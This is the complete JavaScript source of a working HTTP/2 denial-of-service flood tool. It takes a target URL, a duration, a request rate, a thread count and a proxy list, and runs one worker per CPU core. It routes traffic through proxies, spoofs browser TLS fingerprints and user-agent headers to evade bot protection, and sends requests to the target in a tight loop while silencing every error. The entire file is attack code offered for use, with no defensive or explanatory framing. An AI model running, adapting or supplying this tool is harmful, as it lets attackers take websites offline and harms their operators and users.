const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const scp = require("set-cookie-parser");
const crypto = require("crypto");
const fs = require("fs");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function getRandomTLSCiphersuite() {
  const tlsCiphersuites = [
    'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256',
  ];

  const randomCiphersuite = tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];

  return randomCiphersuite;
}
const randomTLSCiphersuite = getRandomTLSCiphersuite();

process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
]
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions =
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_NO_TICKET |
crypto.constants.SSL_OP_NO_COMPRESSION |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_TLSEXT_PADDING |
crypto.constants.SSL_OP_ALL |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`node flood target time req thread proxyfile flood/bypass`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
     input: process.argv[7],
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

const targetURL = parsedTarget.host;
const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 1000;
const numCPUs = os.cpus().length;

if (cluster.isMaster) {
    console.clear()
    console.log(`target: ${process.argv[2]}`);
    console.log(`time: ${process.argv[3]}`);
    console.log(`rate: ${process.argv[4]}`);
    console.log(`thread: ${process.argv[5]}`);
    console.log(`proxyfile: ${process.argv[6]}`);
    console.log('mode: ' + process.argv[7]);
    console.log(`Number of CPU cores: ${numCPUs}`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('Restarting in', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let i = 0; i < numCPUs; i++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('Max RAM usage reached:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    
    setInterval(handleRAMUsage, 10000);

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);

} else {
    setInterval(runFlooder);
}
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera"];
    
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};


     const browserVersion = getRandomInt(125,130);
    const fwfw = ['Google Chrome'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    let brandValue;
    if (browserVersion === 125) {
        brandValue = `"Not_A Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 126) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 127) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 128) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 129) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 130) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
var valueofgod = 1;
                    var signature_0x1 = getRandomInt(82, 110);
                    var cookie;
                    var signature_0x2 = getRandomInt(1000, 9999);
                    var signature_0x3 = getRandomInt(70, 99);
                     
                     const mobiledd = getRandomInt(0, 1);
                  
    const userAgent = `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36`;
   const userAgent1 = `Windows NT 10.0: Win64: x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
  
 const userAgent5 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edg/129.0.2792.79`;
 const userAgent6 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.${signature_0x2}.${signature_0x3} Safari/537.36 Edg/${browserVersion}.0.${signature_0x2}.${signature_0x3}`;
 const userAgent7 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.${signature_0x2}.${signature_0x3} Safari/537.36 Edg/${browserVersion}.0.527.106`;
 const userAgent9 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/${browserVersion}.0.${signature_0x2}.${signature_0x3} Safari/537.36`;

const secChUa = `${brandValue}`;
const u = [
userAgent,
userAgent1,
userAgent5,
userAgent6,
userAgent7,
userAgent9,
];

function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }
 const Socker = new NetSocket();
 
 function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== '');
}

 function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  function randstra(length) {
const characters = "0123456789";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    let interval
    	if (args.input === 'flood') {
	  interval = 1;
	} 
  else if (args.input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
	  interval = randomDelay(5000, 10000);
	} else {
	  process.stdout.write('default : flood\r');
	  interval = 1;
	}

  function randstrr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
 function generateRandomString(minLength, maxLength) {
 const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
 const randomIndex = Math.floor(Math.random() * characters.length);
 return characters[randomIndex];
 });

 return randomStringArray.join('');
}

const uap = u[Math.floor(Math.random() * u.length)];
 
const targetUrl = new URL(args.target);

function generateSASHeaders() {
  const nonce = crypto.randomBytes(16).toString("hex"); // Nonce ngẫu nhiên
  const timestamp = Date.now().toString(); // Thời gian hiện tại

  // Xây dựng giá trị key cho x-sas-key
  const sasKey = crypto
      .createHash("sha256")
      .update(`${nonce}:${timestamp}`)
      .digest("hex");

  return {
      "x-sas-key": sasKey,
      "x-sas-time": timestamp,
      "x-sas-nonce": nonce,
  };
}

// Headers cho từng yêu cầu
const sasHeaders = generateSASHeaders();

// Kết hợp các SAS Header với Headers chính
let headers = {
  ":authority": parsedTarget.host,
  ":method": "GET",
  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "accept-language": "en-US,en;q=0.9",
  "accept-encoding": "gzip, deflate, br",
  ":path": parsedTarget.path,
  ":scheme": "https",
  "sec-ch-ua-platform": "Windows",
  "sec-ch-ua-platform-version": "Windows",
  "pragma": "no-cache",
  "cache-control": "max-age=0",
  "sec-ch-ua": secChUa,
  "sec-fetch-site": "same-origin",
  "sec-fetch-mode": "navigate",
  "sec-fetch-dest": "document",
  "sec-fetch-user": "?1",
  "upgrade-insecure-requests": "1",
  "user-agent": uap,
  "referer": targetUrl.href,
  "x-requested-with": "XMLHttpRequest",
  "dnt": "1",
  ...sasHeaders, // Thêm SAS Header
};
                    
 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 100
 };
 Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return

    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)

    const settings = {
       enablePush: false,
       initialWindowSize: 1073741823,
   };

    const tlsOptions = {
            port: parsedPort,
            ALPNProtocols: ["h2"],
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            servername: url.hostname,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
        };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
            maxSessionMemory: 4444,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
          

client.setMaxListeners(0);
client.settings(settings);
    client.on("connect", () => {
       const IntervalAttack = setInterval(() => {
           for (let i = 0; i < args.Rate; i++) {
            const dynHeaders = {                 
              ...headers,           
            }
               const request = client.request(dynHeaders)
.on("response", response => {
                   request.close();
                   request.destroy();
                  return
               });
               request.end(); 
           }
       }, 0);
      return;
    });
    client.on("close", () => {
        client.destroy();
        connection.destroy();
        return
    });
client.on("timeout", () => {
	client.destroy();
	connection.destroy();
	return
	});
  client.on("error", (error) => {

    client.destroy();
    connection.destroy();
    return
});
});
}
const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);
process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});